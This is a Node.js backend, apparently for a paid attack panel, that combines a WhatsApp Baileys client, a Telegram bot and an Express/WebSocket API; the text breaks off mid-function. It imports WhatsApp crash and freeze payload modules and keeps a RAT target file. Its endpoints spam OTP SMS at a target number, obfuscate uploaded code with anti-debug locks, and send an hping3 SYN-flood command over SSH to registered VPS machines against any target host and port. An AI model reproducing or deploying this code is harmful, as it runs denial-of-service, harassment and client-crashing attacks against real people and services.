const originalStdoutWrite = process.stdout.write.bind(process.stdout);
process.on('unhandledRejection', (reason, promise) => {
  console.log('Unhandled Rejection:', reason);
});

process.on('uncaughtException', (err) => {
  console.log('Uncaught Exception:', err);
});

process.stdout.write = (chunk, encoding, callback) => {
  if (typeof chunk === 'string' && (
    chunk.includes('Closing stale open session') ||
    chunk.includes('Closing session') ||
    chunk.includes('Failed to decrypt message') ||
    chunk.includes('Session error') ||
    chunk.includes('Closing open session') ||
    chunk.includes('Removing old closed'))
  ) return true;
  return originalStdoutWrite(chunk, encoding, callback);
};
process.stderr.write = (chunk, encoding, callback) => {
  if (typeof chunk === 'string' && (
    chunk.includes('Closing stale open session') ||
    chunk.includes('Closing session:') ||
    chunk.includes('Failed to decrypt message') ||
    chunk.includes('Session error:') ||
    chunk.includes('Closing open session') ||
    chunk.includes('Removing old closed'))
  ) return true;
  return originalStderrWrite(chunk, encoding, callback);
};

const safeExit = process.exit;
const {
  default: makeWASocket,
  useSingleFileAuthState,
  useMultiFileAuthState,
  fetchLatestBaileysVersion,
  makeInMemoryStore,
  generateWAMessageFromContent,
  prepareWAMessageMedia,
  downloadContentFromMessage,
  downloadAndSaveMediaMessage,
  makeCacheableSignalKeyStore,
  DisconnectReason,
  proto,
  jidDecode,
  jidEncode,
  areJidsSameUser,
  getContentType,
  Browsers,
  relayWAMessage
} = require("@whiskeysockets/baileys");

const {
  OWNER_ID,
  TOKEN, PORT,
  wsPort,
  news,
  bugs,
  bugsgb,
  tqto
} = require('./config.js');

const {
  BugUiOne,
  BugUiTwo,
  Carouselsock,
  InvisibleX,
  ofmEr,
  OfmSqLJav,
  nullAttack,
  oombimg,
  BugWaxap,
  FreezeToCrash,
  FreezeToCrash2
} = require("./library/BugWazap.js")

const {
  BuggsGb,
  BuggsGb2,
  ZazaMethod,
  StcX,
  groupBan
} = require("./library/GroupBugs.js");

const {
  sqlMemory2,
  sqlMemory3,
  TrashWazap,
  FreezeChat,
  chatlock,
  freezechat,
  PayX,
  convQtd,
  iozk,
  invisOOM,
  invisOOM2,
  annotationz
} = require("./library/BugList.js");

const { startBots } = require("./Deploy/TrashExec.js")

const FileChat = './FileData/chat.json';
const VvpsFile = './FileData/vps.json';

const express = require("express");
const bodyParser = require('body-parser');
const readline = require("readline");
const crypto = require("crypto");
const cors = require('cors');
const app = express();
const TelegramBot = require("node-telegram-bot-api");
const fs = require("fs");
const fsPromises = require('fs').promises;
const path = require('path');
const pino = require('pino');
const P = require('pino')
const axios = require('axios')
const vm = require('vm')
const os = require('os');
const WebSocket = require('ws');
const http = require('http');
const JsConfuser = require("js-confuser");
const { Client } = require('ssh2');
const https = require("https");
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });
const multer = require('multer');
const upload = multer({ 
  limits: { fileSize: 100 * 1024 * 1024 }
});

const { spamOtp } = require('./library/spamOtpSms.js');
const { createBackup, scheduleAutoBackup } = require('./library/backup.js');

const lockChats = {}; 
const activeConnections = {};
const biz = {};
const mess = {};
const rateLimitMap = {};
const qrCodes = {};
let vpsConnections = {}
let activeKeys = {};
let wsClients = {};
let chatList = [];
let vpsList = [];
let notifications = [];
let notificationId = 1;
let cncActive = true;
let GBDB = -1004491209008;
const WakTuMenit = 2 * 60 * 60 * 1000;

const channelIds = [
  "120363407468452340@newsletter",
  "120363422792892562@newsletter",
  "120363421999339977@newsletter",
  "120363424705978951@newsletter",
  "120363419697983933@newsletter"
];

const SessionPath = path.join(__dirname, "library");
const File_Log = path.join(__dirname, 'library', 'user_log');
const waiting = async (ms) => new Promise(resolve => setTimeout(resolve, ms));

function sanitize(input) {
  return String(input)
    .replace(/[<>]/g, '')
    .replace(/[\r\n]/g, ' ')
    .slice(0, 250);
}

const bot = new TelegramBot(TOKEN, { polling: true });
const onlineUsers = new Set();

const RAT_TARGETS = './rat_targets.json';
const RAT_LIVE = {};

function readRat(f) {
  try { return JSON.parse(fs.existsSync(f) ? fs.readFileSync(f,'utf8')||'[]' : '[]'); } catch { return []; }
}
function saveRat(f,d) { try { fs.writeFileSync(f, JSON.stringify(d,null,2)); } catch(_) {} }

function saveChat() {
  fs.writeFileSync(FileChat, JSON.stringify(chatList, null, 2));
}

const DBPath = path.join(__dirname, 'library', 'FileData', 'database.json');
const KeyFile = path.join(__dirname, 'library', 'FileData', 'keyList.json');
const KeyListFile = path.join(__dirname, 'library', 'FileData', 'keyList.json');
const AdminFile = path.join(__dirname, 'library', 'FileData', 'admins.json');

function ensureFileExists(filePath, defaultData) {
  try {
    if (!fs.existsSync(filePath)) {
      // Buat file dengan data default
      fs.writeFileSync(filePath, JSON.stringify(defaultData, null, 2));
      console.log(`[📄 File] ${path.basename(filePath)} baru dibuat.`);
      return defaultData;
    }
    
    // Baca file yang sudah ada
    const data = fs.readFileSync(filePath, 'utf8');
    return JSON.parse(data);
  } catch (error) {
    console.error(`[❌ Error] Gagal membaca ${path.basename(filePath)}:`, error.message);
    return defaultData;
  }
}

function saveChat() {
  try {
    const chatFile = path.join(__dirname, 'library', 'FileData', 'chat.json');
    fs.writeFileSync(chatFile, JSON.stringify(chatList, null, 2));
  } catch (error) {
    console.error('[❌ Error] Gagal menyimpan chat:', error.message);
  }
}

function loadDatabase() {
  try {
    if (!fs.existsSync(DBPath)) {
      fs.writeFileSync(DBPath, JSON.stringify([]));
      console.log("[🗃️ DB] Database baru dibuat.");
      return [];
    }
    const data = JSON.parse(fs.readFileSync(DBPath, 'utf8'));
    return data;
  } catch (error) {
    console.error('[❌ Error] Gagal load database:', error.message);
    return [];
  }
}

function saveDatabase(data) {
  try {
    fs.writeFileSync(DBPath, JSON.stringify(data, null, 2));
  } catch (error) {
    console.error('[❌ Error] Gagal menyimpan database:', error.message);
  }
}

function loadKeyList() {
  try {
    if (!fs.existsSync(KeyListFile)) {
      fs.writeFileSync(KeyListFile, JSON.stringify([]));
      return [];
    }
    return JSON.parse(fs.readFileSync(KeyListFile, 'utf8'));
  } catch (error) {
    console.error('[❌ Error] Gagal load keylist:', error.message);
    return [];
  }
}

function saveKeyList(list) {
  try {
    fs.writeFileSync(KeyListFile, JSON.stringify(list, null, 2));
  } catch (error) {
    console.error('[❌ Error] Gagal menyimpan keylist:', error.message);
  }
}

function loadAdmins() {
  try {
    const defaultData = { 
      groups: [], 
      staf: [], 
      moderator: [], 
      owners: [], 
      patners: [], 
      admins: [], 
      resellers: [] 
    };
    
    if (!fs.existsSync(AdminFile)) {
      fs.writeFileSync(AdminFile, JSON.stringify(defaultData, null, 2));
      console.log('[📄 Admin] File admin baru dibuat.');
      return defaultData;
    }
    
    return JSON.parse(fs.readFileSync(AdminFile, 'utf8'));
  } catch (error) {
    console.log('[❌ Error] Load admins error:', error);
    return { groups: [], owners: [], admins: [], resellers: [] };
  }
}

function saveAdmins(data) {
  try {
    fs.writeFileSync(AdminFile, JSON.stringify(data, null, 2));
    console.log('[💾 Admin] Admins saved');
    return true;
  } catch (error) {
    console.log('[❌ Error] Save admins error:', error);
    return false;
  }
}

function readBotUsers() {
  try {
    const botUsersFile = path.join(__dirname, 'library', 'FileData', 'botUsers.json');
    if (!fs.existsSync(botUsersFile)) {
      fs.writeFileSync(botUsersFile, JSON.stringify([]));
      return [];
    }
    return JSON.parse(fs.readFileSync(botUsersFile, 'utf8'));
  } catch (error) {
    console.log('[❌ Error] Read bot users error:', error);
    return [];
  }
}

function saveBotUsers(users) {
  try {
    const botUsersFile = path.join(__dirname, 'library', 'FileData', 'botUsers.json');
    fs.writeFileSync(botUsersFile, JSON.stringify(users, null, 2));
    console.log('[💾 Bot] Bot users saved');
    return true;
  } catch (error) {
    console.log('[❌ Error] Write bot users error:', error);
    return false;
  }
}

function generateKey() {
  const key = crypto.randomBytes(8).toString("hex");
  console.log("[🔑 GEN] Key baru dibuat:", key);
  return key;
}

function genPairId() {
  return crypto.randomBytes(8).toString('hex').toUpperCase();
}

function isExpired(user) {
  const expired = new Date(user.expiredDate) < new Date();
  console.log(`[⏳ EXP] ${user.username} expired:`, expired);
  return expired;
}

if (fs.existsSync(KeyFile)) {
  try {
    const rawData = fs.readFileSync(KeyFile, 'utf8');
    const parsed = JSON.parse(rawData);

    for (const user of parsed) {
      if (user.sessionKey && user.username && user.lastLogin) {
        const created = new Date(user.lastLogin).getTime();
        const expires = created + 10 * 60 * 1000;

        activeKeys[user.sessionKey] = {
          username: user.username,
          created,
          expires,
        };
      }
    }

    console.log("✅ activeKeys loaded from keyList.json.");
  } catch (err) {
    console.error("❌ Failed to load keyList.json:", err.message);
  }
}

function loadActiveKeysFromFile() {
  try {
    if (!fs.existsSync(KeyListFile)) {
      console.log("[⚠️] keyList.json tidak ditemukan, membuat baru...");
      fs.writeFileSync(KeyListFile, JSON.stringify([]));
      return;
    }
    
    const rawData = fs.readFileSync(KeyListFile, 'utf8');
    const parsed = JSON.parse(rawData);

    for (const entry of parsed) {
      if (entry.sessionKey && entry.username) {
        const created = new Date(entry.lastLogin || Date.now()).getTime();
        const expires = created + 10 * 60 * 1000;
        
        activeKeys[entry.sessionKey] = {
          username: entry.username,
          role: entry.role || 'member',
          created: created,
          expires: expires,
        };
        console.log(`[✅] Loaded key for ${entry.username}: ${entry.sessionKey}`);
      }
    }

    console.log(`[✅] ${Object.keys(activeKeys).length} session keys loaded from keyList.json`);
  } catch (err) {
    console.error("[❌] Failed to load keyList.json:", err.message);
  }
}

async function appendLogAsync(filePath, data) {
  try {
    if (fs.existsSync(filePath)) {
      const stats = fs.statSync(filePath);
      if (stats.size > 5 * 1024 * 1024) {
        fs.writeFileSync(filePath, '');
      }
    }
    await fsPromises.appendFile(filePath, data);
  } catch (err) {
    console.error(`[❌ LOG ERROR] Gagal menulis log: ${err.message}`);
  }
}

async function autoRefresh() {
  try {
    if (!fs.existsSync(SessionPath)) {
      console.log("⚠️ Folder 'library' tidak ditemukan.");
    } else {
      let deletedCount = 0;
      const userFolders = fs.readdirSync(SessionPath);

      for (const userFolder of userFolders) {
        const userPath = path.join(SessionPath, userFolder);
        if (!fs.lstatSync(userPath).isDirectory()) continue;

        const hasJson = fs.readdirSync(userPath).some(f => f.endsWith(".json"));
        if (!hasJson) {
          fs.rmSync(userPath, { recursive: true, force: true });
          deletedCount++;
        }
      }
      console.log(`[AUTO REFRESH] ${deletedCount} folder session kosong dihapus.`);
    }

    console.log("[AUTO REFRESH] Auto restart dijalankan...");

    setTimeout(() => {
      console.log("[AUTO REFRESH] Server aktif dan berjalan normal setelah auto restart.");
    }, 8000);

    setTimeout(() => {
      console.log("[AUTO REFRESH] Process restart server");
      process.exit(0);
    }, 5000);

  } catch (err) {
    console.error("[AUTO REFRESH] Error", err);
  }
}

const getSiuCalcrickObfuscationConfig = () => {
 const generateSiuCalcrickName = () => {
   const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
   let randomPart = "";
   for (let i = 0; i < 6; i++) randomPart += chars[Math.floor(Math.random() * chars.length)];
    return `Calce和SiuSiu无与伦比的帅气${randomPart}`;
   };
    return {
      target: "node",
      compact: true,
      renameVariables: true,
      renameGlobals: true,
      identifierGenerator: generateSiuCalcrickName,
      stringEncoding: true,
      stringSplitting: true,
      controlFlowFlattening: 0.95,
      rgf: false,
      flatten: true,
      duplicateLiteralsRemoval: true,
      deadCode: true,
      calculator: true,
      opaquePredicates: true,
       lock: {
         selfDefending: true,
         antiDebug: true,
         integrity: true,
         tamperProtection: true
        }
    };
};
function hapusIsiUserLogs() {
  if (!fs.existsSync(File_Log)) {
    console.log("[AUTOCLEAN LOGS] Folder tidak ditemukan");
    return;
  }

  const files = fs.readdirSync(File_Log);

  for (const file of files) {
    const filePath = path.join(File_Log, file);
    fs.rmSync(filePath, { recursive: true, force: true });
  }

  console.log("[AUTOCLEAN LOGS] Isi folder berhasil dihapus");
}

if (!fs.existsSync(File_Log)) {
  fs.mkdirSync(File_Log, { recursive: true });
  console.log("[LOGS] Folder 'user_logs' dibuat.");
}

function saveUserLog(username, type, title, description) {
  try {
    const userLogPath = path.join(File_Log, `${username}.json`);
    let logs = [];

    if (fs.existsSync(userLogPath)) {
      logs = JSON.parse(fs.readFileSync(userLogPath, 'utf8'));
    }

    logs.push({
      type: type,
      title: title,
      description: description,
      timestamp: Date.now()
    });

    fs.writeFileSync(userLogPath, JSON.stringify(logs, null, 2));
    console.log(`[LOGS] Activity saved for ${username}: ${type}`);
  } catch (err) {
    console.error(`[LOGS] Gagal simpan log ${username}:`, err.message);
  }
}

wss.on('connection', function (ws, req) {
  let username;

  function broadcastStats() {
    const stats = JSON.stringify({
      type: 'stats',
      onlineUsers: onlineUsers.size,
      activeConnections: wss.clients.size,
    });
    wss.clients.forEach((client) => {
      if (client.readyState === 1) {
        client.send(stats);
      }
    });
  }

  ws.on('message', function (msg) {
    try {
      const data = JSON.parse(msg);

      if (data.type === 'stats') {
        broadcastStats();
      }

      if (data.type === 'sessionCheck') {
        const sessionList = JSON.parse(fs.readFileSync("./library/FileData/keyList.json", "utf8"));
        const user = sessionList.find(e => e.sessionKey === data.key);

        if (!user) {
          ws.send(JSON.stringify({
            type: "forceLogout",
            reason: "Invalid key"
          }));
          return ws.close();
        }

        if (user.androidId !== data.androidId) {
          ws.send(JSON.stringify({
            type: "forceLogout",
            reason: "Another device has logged in"
          }));
          return ws.close();
        }
      }

      if (data.type === 'validate') {
        const session = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
        const validKey = session.find(e => e.sessionKey === data.key);
        const validId = session.find(e => e.androidId === data.androidId);

        if (!validKey) {
          ws.send(JSON.stringify({
            type: "myInfo",
            valid: false,
            reason: "keyInvalid"
          }));
          return ws.close();
        }

        if (!validId) {
          ws.send(JSON.stringify({
            type: "myInfo",
            valid: false,
            reason: "androidIdMismatch"
          }));
          return ws.close();
        }

        const userInfo = session.find(e => e.sessionKey === data.key);
        ws.username = userInfo?.username || data.key;
        onlineUsers.add(ws.username);
        broadcastStats();

        ws.send(JSON.stringify({
          type: "myInfo",
          valid: true,
          username: userInfo?.username,
          androidId: userInfo?.androidId,
          role: userInfo?.role || "member"
        }));

        const interval = setInterval(() => {
         try {
          const session = JSON.parse(fs.readFileSync("./library/FileData/keyList.json", "utf8"));
          const validKey = session.find(e => e.sessionKey === data.key);
          const validId = session.find(e => e.androidId === data.androidId);

          if (!validKey) {
            ws.send(JSON.stringify({
              type: "myInfo",
              valid: false,
              reason: "keyInvalid"
            }));
            clearInterval(interval);
            return ws.close();
          }

          if (!validId) {
            ws.send(JSON.stringify({
              type: "myInfo",
              valid: false,
              reason: "androidIdMismatch"
            }));
            clearInterval(interval);
            return ws.close();
          }

        } catch (e) {
          console.error("WS session check error:", e.message);
         }
       }, 30000);

        ws.interval = interval;
      }

      if (data.type === 'auth') {
        username = getUserByKey(data.key);
        console.log(username);
        if (!username) return ws.close();
        wsClients[username] = ws;

        const list = chatList
          .filter(m => m.from === username || m.to === username)
          .map(m => (m.from === username ? m.to : m.from));

        ws.send(JSON.stringify({
          type: "chatList",
          users: [...new Set(list)],
        }));
      }

      if (data.type === 'chat') {
        const to = data.to;
        const message = sanitize(data.message);
        if (!username || !to || !message || message.length > 250) return;

        const chat = {
          from: username,
          to,
          message,
          time: new Date().toISOString()
        };
        chatList.push(chat);
        saveChat();

        ws.send(JSON.stringify({ type: 'chat', message: { ...chat, fromMe: true } }));

        if (wsClients[to]) {
          wsClients[to].send(JSON.stringify({
            type: 'chat',
            message: { ...chat, fromMe: false }
          }));
        }
      }

      if (data.type === 'getMessages') {
        const withUser = data.with;
        const messages = chatList
          .filter(m =>
            (m.from === username && m.to === withUser) ||
            (m.from === withUser && m.to === username)
          )
          .map(m => ({
            ...m,
            fromMe: m.from === username
          }));

        ws.send(JSON.stringify({ type: 'messages', with: withUser, messages }));
      }

    } catch (e) {
      console.error("WS error:", e.message);
    }
  });

  ws.on('close', () => {
    if (ws.username) {
      onlineUsers.delete(ws.username);
      broadcastStats();
    }
    if (ws.interval) clearInterval(ws.interval);
    if (username && wsClients[username]) {
      delete wsClients[username];
    }
  });
});

server.listen(wsPort, () => {
  console.log(`🟣 Server running on https://xeternalzsrvrnew.miunnst.site:${wsPort}`);
});

app.use(express.json({ limit: '100mb' }));
app.use(express.urlencoded({ limit: '100mb', extended: true }));
app.use(express.json());
app.use(rateLimiter);

function rateLimiter(req, res, next) {
  const key = (req.query && req.query.key) || (req.body && req.body.key) || null;
  if (!key) return next();

  const now = Date.now();
  if (!rateLimitMap[key]) rateLimitMap[key] = [];

  rateLimitMap[key] = rateLimitMap[key].filter(ts => now - ts < 1000);
  rateLimitMap[key].push(now);

  if (rateLimitMap[key].length > 20) {
    const db = loadDatabase();
    const user = db.find(u => u.username === (activeKeys[key]?.username || "unknown"));
    console.warn(`[🚫 RATE LIMIT] Token '${key}' (${user?.username || 'unknown'}) melebihi batas 20 req/detik.`);

    return res.status(429).json({
      valid: false,
      rateLimit: true,
      message: "Terlalu banyak permintaan! Maksimal 20 request per detik.",
    });
  }

  next();
}

app.use(rateLimiter);

app.use((req, res, next) => {
  res.header("Access-Control-Allow-Origin", "*");
  res.header("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
  res.header("Access-Control-Allow-Headers", "Content-Type");
  next();
});

function connectToAllVPS() {
  if (!cncActive) return;
  console.log("🔄 Connecting to all VPS servers...");
  for (const vps of vpsList) {
    if (vpsConnections[vps.host]) {
      console.log(`✅ Already connected to ${vps.host}`);
      continue;
    }

    const conn = new Client();

    conn.on('ready', () => {
      if (!cncActive) {
        conn.end();
        return;
      }

      console.log(`✅ Connected to VPS: ${vps.host}`);
      vpsConnections[vps.host] = conn;

      conn.on('close', () => {
        console.log(`🔌 Disconnected: ${vps.host}`);
        delete vpsConnections[vps.host];

        if (cncActive) {
          console.log(`🔁 Reconnecting to ${vps.host} in 5s...`);
          setTimeout(connectToAllVPS, 5000);
        }
      });
    });

    conn.on('error', (err) => {
      console.log(`❌ Failed to connect to ${vps.host}: ${err.message}`);
    });

    conn.connect({
      host: vps.host,
      username: vps.username,
      password: vps.password,
      readyTimeout: 5000
    });
  }
}
if (fs.existsSync(VvpsFile)) {
  vpsList = JSON.parse(fs.readFileSync(VvpsFile, 'utf8'));
  console.log("📥 VPS list loaded.");
  connectToAllVPS();
}

if (fs.existsSync(VvpsFile)) {
  fs.watch(VvpsFile, () => {
    try {
      vpsList = JSON.parse(fs.readFileSync(VvpsFile, 'utf8'));
      console.log("🔄 VPS list updated.");
      connectToAllVPS();
    } catch (e) {
      console.error("❌ Failed to update VPS list:", e.message);
    }
  });
  console.log("👀 Watching VPS file for changes...");
} else {
  console.error("⚠️ File not found:", VvpsFile);
}
function disconnectAllVPS() {
  console.log("🛑 Disconnecting all VPS connections...");
  cncActive = false;

  for (const host in vpsConnections) {
    vpsConnections[host].end();
    delete vpsConnections[host];
  }
}

function getUserByKey(key) {
  const keyInfo = activeKeys[key];
  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  return user ? keyInfo.username : null;
}

app.get('/health', (req, res) => {
  res.json({
    status: 'OK',
    timestamp: new Date().toISOString(),
    server: 'Nted Notification Server',
    uptime: process.uptime(),
    memory: process.memoryUsage(),
    totalNotifications: notifications.length
  });
});

app.get('/notifications', (req, res) => {
  try {
    const ownerNotifs = notifications.filter(n => n.senderRole === 'developer');
    
    ownerNotifs.sort((a, b) => b.id - a.id);
    
    res.json(ownerNotifs);
  } catch (error) {
    console.error('❌ GET Error:', error);
    res.status(500).json({
      error: 'Internal server error',
      message: error.message
    });
  }
});

app.get('/notifications/:id', (req, res) => {
  try {
    const id = parseInt(req.params.id);
    const notif = notifications.find(n => n.id === id);
    
    if (!notif) {
      return res.status(404).json({
        error: 'Notifikasi tidak ditemukan',
        id: id
      });
    }
    
    res.json(notif);
  } catch (error) {
    console.error('❌ GET Single Error:', error);
    res.status(500).json({
      error: 'Internal server error',
      message: error.message
    });
  }
});

app.post('/notifications', async (req, res) => {
  try {
    const { senderRole, title, body } = req.body;

    if (!senderRole || !title || !body) {
      return res.status(400).json({
        error: 'Missing required fields',
        required: ['senderRole', 'title', 'body'],
        received: { senderRole, title, body }
      });
    }

    if (senderRole !== 'developer') {
      return res.status(403).json({
        error: '❌ Hanya owner yang bisa kirim notif',
        role: senderRole,
        allowedRole: 'developer'
      });
    }

    if (title.length < 3) {
      return res.status(400).json({
        error: 'Judul terlalu pendek (minimal 3 karakter)',
        length: title.length
      });
    }

    if (body.length < 5) {
      return res.status(400).json({
        error: 'Isi pesan terlalu pendek (minimal 5 karakter)',
        length: body.length
      });
    }

    const notif = {
      id: notificationId++,
      title: title.trim(),
      body: body.trim(),
      senderRole: senderRole,
      timestamp: new Date().toISOString(),
      createdAt: Date.now(),
      isRead: false
    };

    notifications.unshift(notif);
    
    console.log('📨 Notif baru:', notif);
    console.log(`📊 Total notif: ${notifications.length}`);

    res.status(201).json({
      success: true,
      message: 'Notifikasi berhasil dikirim',
      notif: notif,
      total: notifications.length
    });

  } catch (error) {
    console.error('❌ POST Error:', error);
    res.status(500).json({
      error: 'Internal server error',
      message: error.message
    });
  }
});

app.put('/notifications/:id', (req, res) => {
  try {
    const id = parseInt(req.params.id);
    const { title, body, isRead } = req.body;
    
    const index = notifications.findIndex(n => n.id === id);
    
    if (index === -1) {
      return res.status(404).json({
        error: 'Notifikasi tidak ditemukan',
        id: id
      });
    }

    if (title) notifications[index].title = title.trim();
    if (body) notifications[index].body = body.trim();
    if (isRead !== undefined) notifications[index].isRead = isRead;
    notifications[index].updatedAt = new Date().toISOString();

    console.log('✏️ Notif diupdate:', notifications[index]);

    res.json({
      success: true,
      message: 'Notifikasi berhasil diupdate',
      notif: notifications[index]
    });

  } catch (error) {
    console.error('❌ PUT Error:', error);
    res.status(500).json({
      error: 'Internal server error',
      message: error.message
    });
  }
});

app.delete('/notifications/:id', (req, res) => {
  try {
    const id = parseInt(req.params.id);
    const index = notifications.findIndex(n => n.id === id);
    
    if (index === -1) {
      return res.status(404).json({
        error: 'Notifikasi tidak ditemukan',
        id: id
      });
    }

    const deleted = notifications[index];
    notifications.splice(index, 1);

    console.log('🗑️ Notif dihapus:', deleted);
    console.log(`📊 Sisa notif: ${notifications.length}`);

    res.json({
      success: true,
      message: 'Notifikasi berhasil dihapus',
      deleted: deleted,
      total: notifications.length
    });

  } catch (error) {
    console.error('❌ DELETE Error:', error);
    res.status(500).json({
      error: 'Internal server error',
      message: error.message
    });
  }
});

app.delete('/notifications', (req, res) => {
  try {
    const count = notifications.length;
    notifications = [];
    notificationId = 1;

    console.log(`🗑️ Semua notif dihapus (${count} notif)`);

    res.json({
      success: true,
      message: 'Semua notifikasi berhasil dihapus',
      deleted: count
    });

  } catch (error) {
    console.error('❌ DELETE All Error:', error);
    res.status(500).json({
      error: 'Internal server error',
      message: error.message
    });
  }
});

app.patch('/notifications/:id/read', (req, res) => {
  try {
    const id = parseInt(req.params.id);
    const { isRead } = req.body;
    
    const index = notifications.findIndex(n => n.id === id);
    
    if (index === -1) {
      return res.status(404).json({
        error: 'Notifikasi tidak ditemukan',
        id: id
      });
    }

    notifications[index].isRead = isRead !== undefined ? isRead : true;
    notifications[index].updatedAt = new Date().toISOString();

    console.log(`👁️ Notif ${isRead ? 'dibaca' : 'belum dibaca'}:`, notifications[index]);

    res.json({
      success: true,
      message: `Notifikasi ${isRead ? 'ditandai dibaca' : 'ditandai belum dibaca'}`,
      notif: notifications[index]
    });

  } catch (error) {
    console.error('❌ PATCH Error:', error);
    res.status(500).json({
      error: 'Internal server error',
      message: error.message
    });
  }
});

app.get('/stats', (req, res) => {
  try {
    const total = notifications.length;
    const read = notifications.filter(n => n.isRead).length;
    const unread = total - read;
    const ownerNotifs = notifications.filter(n => n.senderRole === 'developer').length;

    res.json({
      total: total,
      read: read,
      unread: unread,
      owner: ownerNotifs,
      lastNotification: notifications.length > 0 ? notifications[0] : null,
      timestamp: new Date().toISOString()
    });

  } catch (error) {
    console.error('❌ Stats Error:', error);
    res.status(500).json({
      error: 'Internal server error',
      message: error.message
    });
  }
});

app.get('/search', (req, res) => {
  try {
    const { q } = req.query;
    
    if (!q) {
      return res.status(400).json({
        error: 'Parameter query "q" diperlukan'
      });
    }

    const query = q.toLowerCase();
    const results = notifications.filter(n => 
      n.title.toLowerCase().includes(query) ||
      n.body.toLowerCase().includes(query)
    );

    res.json({
      query: q,
      count: results.length,
      results: results
    });

  } catch (error) {
    console.error('❌ Search Error:', error);
    res.status(500).json({
      error: 'Internal server error',
      message: error.message
    });
  }
});

app.post('/api/spam-otp', async (req, res) => {
  const { number } = req.body;
  if (!number) {
    return res.status(400).json({ error: 'Nomor target wajib diisi' });
  }

  try {
    const results = await spamOtp(number);
    res.json({
      target: number,
      results
    });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

app.get("/config", (req, res) => {
  res.json(getSiuCalcrickObfuscationConfig());
});

app.post('/deploybot', async (req, res) => {
  const { token, ownerId } = req.body;
  if (!token || !ownerId) {
    return res.json({ ok: false, msg: 'Token/Owner kosong!' });
  }

  try {
    const cleanToken = token.trim();
    const cleanOwner = ownerId.trim();
    const { data } = await axios.get(`https://api.telegram.org/bot${cleanToken}/getMe`);
    if (!data.ok) {
      return res.json({ ok: false, msg: 'Token invalid!' });
    }

    const username = data.result.username;
    const configPath = path.join(__dirname, './Deploy/Config.js');
    let { Token = [], Owner = [] } = fs.existsSync(configPath)
      ? require('./Deploy/Config.js')
      : {};

    delete require.cache[require.resolve('./Deploy/Config.js')];

    if (!Token.includes(cleanToken)) Token.push(cleanToken);
    if (!Owner.includes(cleanOwner)) Owner.push(cleanOwner);

    fs.writeFileSync(configPath, `module.exports = {
  Token: ${JSON.stringify(Token, null, 2)},
  Owner: ${JSON.stringify(Owner, null, 2)}
};`, 'utf8');

    startBots();

    return res.json({ ok: true, username });
  } catch (e) {
    console.error('Deploy error:', e.stack || e.message);
    return res.json({ ok: false, msg: e.message });
  }
});

app.post("/encrypt", upload.single('file'), async (req, res) => {
  try {
    if (!req.file) {
      return res.status(400).json({ error: "File is required" });
    }
    
    const code = req.file.buffer.toString('utf8');
    const config = getSiuCalcrickObfuscationConfig();
    
    if (!config || typeof config !== 'object') {
      return res.status(500).json({ error: "Invalid config" });
    }
    
    const obfuscated = await JsConfuser.obfuscate(code, config);
    const obfuscatedStr = typeof obfuscated === 'string' ? obfuscated : JSON.stringify(obfuscated);
    const encryptedBase64 = Buffer.from(obfuscatedStr, 'utf8').toString('base64');
    
    res.json({ encrypted: encryptedBase64 });
  } catch (err) {
    console.error('Encrypt error:', err);
    res.status(500).json({ error: "Encryption failed: " + err.message });
  }
});
app.get("/myServer", (req, res) => {
  const key = req.query.key;
  const username = getUserByKey(key);
  if (!username) return res.status(401).json({ error: "Invalid session key" });

  const userVPS = vpsList.filter(vps => vps.owner === username);
  res.json(userVPS);
});

app.post("/addServer", (req, res) => {
  const { key, host, username: sshUser, password } = req.body;
  const owner = getUserByKey(key);
  if (!owner) return res.status(401).json({ error: "Invalid session key" });

  if (!host || !sshUser || !password) return res.status(400).json({ error: "Missing fields" });

  const newVPS = { host, username: sshUser, password, owner };
  vpsList.push(newVPS);
  fs.writeFileSync(VvpsFile, JSON.stringify(vpsList, null, 2));
  res.json({ success: true, message: "VPS added" });
});

app.post("/delServer", (req, res) => {
  const { key, host } = req.body;
  const owner = getUserByKey(key);
  if (!owner) return res.status(401).json({ error: "Invalid session key" });

  const before = vpsList.length;
  vpsList = vpsList.filter(vps => !(vps.host === host && vps.owner === owner));
  fs.writeFileSync(VvpsFile, JSON.stringify(vpsList, null, 2));

  const deleted = before !== vpsList.length;
  res.json({ success: deleted, message: deleted ? "VPS deleted" : "VPS not found" });
});

app.post("/sendCommand", (req, res) => {
  const { key, target, port, duration } = req.body;
  const owner = getUserByKey(key);
  if (!owner) return res.status(401).json({ error: "Invalid session key" });

  if (!target || !port || !duration) return res.status(400).json({ error: "Missing fields" });

  const userVPS = vpsList.filter(vps => vps.owner === owner);
  if (userVPS.length === 0) return res.status(400).json({ error: "No VPS available for this user" });

  for (const vps of userVPS) {
    const conn = vpsConnections[vps.host];
    if (!conn) {
      console.log(`❌ Not connected to ${vps.host}`);
      continue;
    }

    const command = `screen -dmS hping3 -S --flood ${target} -p ${port}`;
    const killCmd = `sleep ${duration}; pkill screen`;

    conn.exec(`${command} && ${killCmd}`, (err, stream) => {
      if (err) return console.error(`❌ Exec error on ${vps.host}:`, err.message);
      stream.on('close', (code, signal) => {
        console.log(`✅ Command done on ${vps.host} (code: ${code})`);
      });
    });
  }

  res.json({ success: true, message: `Command sent to ${userVPS.length} VPS` });
});

app.get("/tq", async (req, res) => {
  res.json({ status: true, result: tqto });
});
app.get("/api/chat/messages", (req, res) => {
  const { session_key } = req.query;
  
  const keyInfo = activeKeys[session_key];
  if (!keyInfo) {
    return res.status(401).json({ valid: false, message: "Invalid session key" });
  }
  
  const username = keyInfo.username;
  const userMessages = chatList.filter(m => 
    m.from === username || m.to === username
  );
  
  res.json(userMessages);
});
app.post("/api/chat/send", (req, res) => {
  const { session_key, username, role, message } = req.body;
  
  const keyInfo = activeKeys[session_key];
  if (!keyInfo) {
    return res.status(401).json({ valid: false, message: "Invalid session" });
  }
  
  if (keyInfo.username !== username) {
    return res.status(401).json({ valid: false, message: "Username mismatch" });
  }
  
  if (!message || message.trim() === "") {
    return res.status(400).json({ valid: false, message: "Message cannot be empty" });
  }
  
  const chat = {
    from: username,
    to: "public",
    message: sanitize(message),
    role: role,
    time: new Date().toISOString(),
    created_at: new Date().toISOString()
  };
  
  chatList.push(chat);
  saveChat();
  
  for (const ws of Object.values(wsClients)) {
    if (ws.readyState === WebSocket.OPEN) {
      ws.send(JSON.stringify({
